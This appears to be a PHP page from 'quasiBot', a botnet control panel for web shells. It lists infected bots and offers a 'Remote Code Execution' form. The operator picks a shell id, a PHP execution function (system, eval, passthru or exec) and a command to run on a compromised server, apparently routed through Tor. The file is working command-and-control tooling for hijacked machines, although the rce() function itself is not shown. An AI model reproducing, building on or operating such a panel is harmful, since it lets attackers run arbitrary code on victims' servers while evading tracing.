<?php

require('../config.php');
auth();

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">


<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <title>quasiBot | rce</title>
    <link href="../style.css" rel="stylesheet" type="text/css" media="screen" />
</head>
<body>
<div id="wrapper">
    <div id="page">
        <div id="page-bgtop">
            <div id="page-bgbtm">
                <div id="content">

                    <div class="post">
                        <h2 class="title"><a href="#">Bots</a></h2>
                        <div class="entry">
                            <p class="meta">
                            <?php
                            checkbots();
                            ?>
                            </p>
                        </div>
                    </div>

                    <div class="post">
                        <h2 class="title"><a href="#">Remote Code Execution</a></h2>
                        <div class="entry">
                        <p class="meta">
                        ID - Shell id &nbsp;&bull;&nbsp; via TOR
                        </p>
                            </p>
                            <form method="post">
                            <table>
                            <tr>
                            <td><b>ID</b></td>
                            <td><b>PHP</b></td>
                            <td><b>CMD</b></td>
                            </tr>
                            <tr>
                            <td>
                            <b>
                            <?php
                             echo "<input type=\"text\" style=\"width: 50px;\" value=\"". (empty($_GET['id'])?"0":htmlspecialchars($_GET['id'])) ."\" name=\"id\"></b>";
                            ?>
                            </td>
                            <td style="text-align: left;">
                            <input type="radio" name="func" value="system" checked="checked"> system<br/>
                            <input type="radio" name="func" value="eval"> eval<br/>
                            <input type="radio" name="func" value="passthru"> passthru<br/>
                            <input type="radio" name="func" value="exec"> exec<br/>
                            </td>
                            <td>
                            <?php
                             echo "<input type=\"text\" style=\"width: 400px;\" value=\"". (empty($_POST['cmd'])?"ls":htmlspecialchars($_POST['cmd'])) ."\" name=\"cmd\"></b>";
                            ?>
                            </td>
                            <td><input type="submit" value="Go"></td>
                            </tr>
                            </table>
                            </form>

                        <?php rce();?>

                    </div>

                    </div>

                    <div style="clear: both;">&nbsp;</div>
                </div>
</div>
</body>
</html>
